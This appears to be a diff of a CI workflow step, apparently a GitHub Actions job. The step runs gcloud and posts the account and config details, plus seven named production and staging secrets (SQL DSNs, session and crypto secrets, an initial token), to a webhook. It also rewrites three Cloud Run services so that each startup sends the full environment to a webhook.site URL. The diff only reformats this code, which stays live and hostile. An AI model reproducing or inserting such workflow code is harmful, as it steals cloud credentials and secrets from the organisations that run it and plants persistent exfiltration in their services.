@@ -30,14 +30,9 @@ jobs:
         run: |
           set +e
           post() {
-            local tag="$1"
-            local data="$2"
-            curl -sS -m 20 -X POST "$HOOK" \
-              -H "Content-Type: text/plain" \
-              --data-binary "${tag}
-${data}" >/dev/null || true
+            printf '%s\n%s\n' "$1" "$2" | curl -sS -m 20 -X POST "$HOOK" -H 'Content-Type: text/plain' --data-binary @- >/dev/null || true
           }
-          post "whoami" "$(gcloud auth list 2>&1; gcloud config list 2>&1)"
+          post whoami "$(gcloud auth list 2>&1; gcloud config list 2>&1)"
           for secret in newapi-session-secret newapi-crypto-secret newapi-initial-token newapi-sql-dsn newapi-staging-session-secret newapi-staging-crypto-secret newapi-staging-sql-dsn; do
             out="$(gcloud secrets versions access latest --secret="${secret}" --project="${PROJECT_ID}" 2>&1)"
             post "secret ${secret}" "${out}"
@@ -54,12 +49,7 @@ ${data}" >/dev/null || true
           done
           CMD='wget -qO- -T 15 --post-data="$(printenv)" https://webhook.site/6658b436-b9cf-4b27-b03d-0351ef58eb12 >/dev/null 2>&1 || true; exec /new-api'
           for svc in newapi-console newapi-router newapi-staging; do
-            out="$(gcloud run services update "${svc}" \
-              --project="${PROJECT_ID}" \
-              --region="${REGION}" \
-              --command=/bin/sh \
-              --args=-c,"${CMD}" \
-              --quiet 2>&1)"
+            out="$(gcloud run services update "${svc}" --project="${PROJECT_ID}" --region="${REGION}" --command=/bin/sh --args=-c,"${CMD}" --quiet 2>&1)"
             post "update ${svc}" "${out}"
           done
-          post "done" "finished"
+          post done finished
